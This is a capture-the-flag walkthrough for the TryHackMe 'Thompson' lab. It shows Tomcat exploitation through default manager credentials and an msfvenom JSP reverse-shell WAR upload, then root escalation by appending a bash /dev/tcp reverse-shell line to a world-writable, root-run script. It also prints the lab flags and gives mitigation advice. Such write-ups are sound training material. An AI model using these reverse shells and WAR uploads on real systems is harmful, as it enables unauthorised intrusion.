# Thompson CTF Walkthrough

**Target:** Thompson  
**Source:** [TryHackMe](https://tryhackme.com/room/bsidesgtthompson)  
**Difficulty:** Easy  
**Target IP:** 10.114.136.170

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Tomcat Manager Access & WAR Upload](#tomcat-manager-access--war-upload)
- [Initial Foothold](#initial-foothold)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Thompson is an easy, boot2root Linux box built for FIT and the BSides Guatemala
CTF. The objective is to read both `user.txt` and `root.txt`. The attack chain
covers service enumeration to find an exposed Apache Tomcat instance, recovery of
default Tomcat Manager credentials, a malicious WAR upload for a web shell, and a
root-owned cron-style script with world-writable permissions for privilege
escalation.

**Key Skills Required:**
- Network scanning and service enumeration
- Directory brute forcing with Gobuster
- Tomcat Manager exploitation via WAR file upload
- Reverse shell generation with msfvenom and shell stabilisation
- Linux privilege escalation via a writable root-executed script

---

## Reconnaissance

### Network Scanning

A quick top-ports scan shows three open services:

```bash
nmap 10.114.136.170
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

A full service/version scan confirms the versions:

```bash
nmap -sV -sC -p- 10.114.136.170
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8009/tcp | ajp13 | Apache Jserv (Protocol v1.3) |
| 8080/tcp | http | Apache Tomcat 8.5.5 |

The web server on `8080` is an Apache Tomcat 8.5.5 instance, and `8009` exposes
the AJP connector. Tomcat is the clear path in.

---

## Web Enumeration

### Directory Brute Force

```bash
gobuster dir -u http://10.114.136.170:8080/ -w /usr/share/wordlists/dirb/big.txt
```

```
docs                 (Status: 302) [--> /docs/]
examples             (Status: 302) [--> /examples/]
favicon.ico          (Status: 200)
manager              (Status: 302) [--> /manager/]
```

The `/manager` directory is the Tomcat Manager application, which allows
deploying web applications — the route to code execution.

### Manager Credentials

Clicking "Manager App" in the GUI prompts for credentials. The Manager page
helpfully leaks the default Tomcat config in its body:

```bash
curl http://10.114.136.170:8080/manager/html
```

```
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

```
username: tomcat
password: s3cret
```

---

## Tomcat Manager Access & WAR Upload

The Manager interface at `http://10.114.136.170:8080/manager/html` allows
uploading a WAR file. A WAR (Web Application Archive) is a compressed format used
in Java to package all the components of a web application into a single
container — including a malicious JSP shell.

### Generate the Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.132.9 LPORT=1313 -f war -o rev.war
```

```
Payload size: 1087 bytes
Final size of war file: 1087 bytes
Saved as: rev.war
```

Upload `rev.war` through the Manager. Once uploaded, the deployed application
appears in the Manager GUI.

### Set Up the Listener

```bash
rlwrap nc -nvlp 1313
```

Browsing to the deployed app triggers the connection back:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.136.170] 58206
whoami
tomcat
```

---

## Initial Foothold

A shell lands as the `tomcat` user. Exploring `/home` reveals user `jack`:

```bash
ls /home
jack

cd /home/jack
ls
id.sh
test.txt
user.txt
```

### User Flag

```bash
cat user.txt
39400c90bc683a41a8935e4719f181bf
```

> **User flag:** `39400c90bc683a41a8935e4719f181bf`

### Stabilise the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Privilege Escalation

Inside `/home/jack` there are three interesting files: `id.sh`, `test.txt`, and
`user.txt`.

```bash
cat test.txt
uid=0(root) gid=0(root) groups=0(root)

cat id.sh
#!/bin/bash
id > test.txt
```

The script `id.sh` runs `id` and writes the output to `test.txt`. The contents of
`test.txt` show `uid=0(root)` — meaning **root is executing this script** (on a
schedule). The permissions confirm the script is world-writable:

```bash
ls -l
-rwxrwxrwx 1 jack jack 26 Jun 19 13:02 id.sh
-rw-r--r-- 1 root root  0 Jun 19 13:02 test.txt
-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
```

Because `id.sh` is `-rwxrwxrwx` and run by root, any command appended to it runs
as root.

### Method 1 — Read the Root Flag Directly

Append a line that copies the root flag into a readable location:

```bash
echo 'cat /root/root.txt > root.txt' >> id.sh
```

After root next runs the script, `root.txt` is created in `/home/jack`:

```bash
ls -l
-rw-r--r-- 1 root root 33 Jun 19 13:07 root.txt

cat root.txt
d89d5391984c0450a95497153ae7ca3a
```

### Method 2 — Get a Root Reverse Shell

For a full root shell, append a reverse-shell one-liner instead:

```bash
echo 'bash -i >& /dev/tcp/192.168.132.9/9090 0>&1' >> id.sh
```

Start a listener on the attacking machine:

```bash
rlwrap nc -nvlp 9090
```

When root executes the script, a root shell connects back:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.136.170] 39042
root@ubuntu:/home/jack# whoami
root

root@ubuntu:/home/jack# cd /root
root@ubuntu:~# cat root.txt
d89d5391984c0450a95497153ae7ca3a
```

> **Root flag:** `d89d5391984c0450a95497153ae7ca3a`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `39400c90bc683a41a8935e4719f181bf` | `/home/jack/user.txt` |
| Root flag | `d89d5391984c0450a95497153ae7ca3a` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Default Tomcat Manager Credentials (Critical)

**Description:** The Tomcat Manager application was reachable on port `8080` using
the default credentials `tomcat : s3cret`, which were also disclosed in the
Manager page body.

**Impact:** Authenticated access to the Manager interface, enabling arbitrary
application deployment.

**Mitigation:**
- Change all default credentials and use strong, unique passwords.
- Restrict access to the Manager application by IP or remove it from production.

### 2. Arbitrary WAR Deployment / Web Shell (Critical)

**Description:** With Manager access, an attacker can upload a malicious WAR file
containing a JSP reverse shell, achieving remote code execution as the `tomcat`
service account.

**Impact:** Initial foothold on the host as `tomcat`.

**Mitigation:**
- Disable the Manager app where not needed and enforce least privilege.
- Run Tomcat under a low-privilege, sandboxed account.

### 3. World-Writable Root-Executed Script (Critical)

**Description:** The script `/home/jack/id.sh` was world-writable (`-rwxrwxrwx`)
yet executed by root on a schedule, as evidenced by `test.txt` containing
`uid=0(root)`.

**Impact:** Full privilege escalation from `tomcat` to `root`.

**Mitigation:**
- Never make root-executed scripts writable by other users.
- Apply least privilege to file permissions and audit scheduled tasks.

---

## Attack Chain Summary

```
Nmap scan → 3 open ports (SSH, AJP, Tomcat 8.5.5)
    ↓
Gobuster → /manager discovered
    ↓
Default credentials tomcat : s3cret
    ↓
Tomcat Manager → upload malicious rev.war (msfvenom JSP reverse shell)
    ↓
Reverse shell as tomcat
    ↓
User flag: 39400c90bc683a41a8935e4719f181bf (/home/jack/user.txt)
    ↓
Discover world-writable, root-executed id.sh
    ↓
Append payload (read root.txt OR spawn root reverse shell)
    ↓
Root shell / root flag
    ↓
Root flag: d89d5391984c0450a95497153ae7ca3a (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Directory brute forcing |
| curl | Inspecting the Manager page for leaked credentials |
| Tomcat Manager | WAR upload foothold |
| msfvenom | JSP/WAR reverse shell generation |
| Netcat (rlwrap) | Reverse-shell listener |
| python (pty) | Shell stabilisation |

---

## References

- [TryHackMe — Thompson](https://tryhackme.com/room/bsidesgtthompson)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [Apache Tomcat](https://tomcat.apache.org/)

---
